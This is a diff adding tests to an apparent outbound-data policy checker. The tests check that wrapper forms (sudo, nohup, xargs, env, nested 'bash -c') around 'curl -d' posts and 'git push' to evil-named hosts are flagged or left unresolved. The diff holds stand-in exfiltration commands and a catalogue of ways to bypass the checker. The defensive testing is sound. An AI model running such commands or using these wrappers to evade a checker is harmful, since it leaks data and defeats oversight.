@@ -114,4 +114,42 @@ describe('CC round 3: wrappers, reserved words, and git pinning', () => {
       rule: 'git-push', verdict: 'allowed', destination: 'github:origin',
     })
   })
+
+  test('wrappers hiding a shell or env are all seen; one -c level only (CC round 4 D)', () => {
+    // Every CC bypass form resolves to its real send, not silence.
+    const sends: Array<[string, string]> = [
+      ['sudo bash -c "git push https://github.com/evil/x"', 'github:evil/x'],
+      ['nohup sh -c "curl -d x https://evil.example.org"', 'host:evil.example.org'],
+      ['xargs sh -c "curl -d x https://evil.example.org"', 'host:evil.example.org'],
+      ['sudo env git push fork main', 'github:other/fork'],
+      ['env -- curl -d x https://host.example.org/hook', 'host:host.example.org'],
+    ]
+    for (const [command, destination] of sends) {
+      expect(verdictOf(command)).toMatchObject({ verdict: 'violation' as const, destination })
+    }
+    // env -C moves the effective cwd: /other holds no repository in the
+    // facts, so the push reads unresolved, never silently allowed.
+    expect(verdictOf('env -C /other git push')).toMatchObject({
+      rule: 'git-push', verdict: 'unknown-destination', destination: 'unresolved:no repository at the cwd',
+    })
+    // Assignments through a wrapper pin exactly as bare ones do.
+    expect(verdictOf('sudo GIT_DIR=/x/.git git push')).toMatchObject({ rule: 'git-push', verdict: 'unknown-destination' })
+    expect(verdictOf('timeout 5 env GH_REPO=evil/x gh pr create --title x')).toMatchObject({ rule: 'gh-write', verdict: 'unknown-destination' })
+  })
+
+  test('a second -c level, env -S, and unknown wrapper flags read unresolved, labeled by the wrapped command', () => {
+    expect(verdictOf('bash -c "bash -c \\"curl -d x https://evil.example.org\\""')).toMatchObject({
+      rule: 'http-send', verdict: 'unknown-destination', destination: 'unresolved:a second -c level is never unwrapped',
+    })
+    expect(verdictOf('env -S "git push"')).toMatchObject({
+      rule: 'git-push', verdict: 'unknown-destination', destination: 'unresolved:the env options were not understood',
+    })
+    // The fallback label names the WRAPPED command, never the wrapper.
+    expect(verdictOf('sudo -Z git push origin main')).toMatchObject({
+      rule: 'git-push', verdict: 'unknown-destination', destination: 'unresolved:the sudo options were not understood',
+    })
+    expect(verdictOf('xargs --strange curl -d x https://host.example.org')).toMatchObject({
+      rule: 'http-send', verdict: 'unknown-destination',
+    })
+  })
 })
